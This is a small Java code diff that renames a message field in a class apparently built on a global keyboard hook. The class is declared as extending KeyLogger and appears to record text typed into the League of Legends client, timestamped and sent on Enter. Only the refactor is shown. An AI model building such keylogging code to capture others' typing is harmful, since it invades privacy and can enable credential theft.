@@ -17,7 +17,7 @@ public class LolClientLogger extends KeyLogger implements NativeKeyListener {
     private static LolClientLogger ourInstance = new LolClientLogger();
 
     private LolClientLogger() {
-        super.message = "From: LoL-Client || At: " + getCurrentTime() + "|| Message: ";
+        super.baseMessage = "From: LoL-Client || At: " + getCurrentTime() + "|| Message: ";
         super.sendKey = "Enter";
     }
 
@@ -50,7 +50,8 @@ public class LolClientLogger extends KeyLogger implements NativeKeyListener {
 
     @Override
     void setDefaults() {
-        super.message = "From: LoL-Client || At: " + getCurrentTime() + "|| Message: ";
+        super.baseMessage = "From: LoL-Client || At: " + getCurrentTime() + "|| Message: ";
+        message = "";
     }
 
     @Override
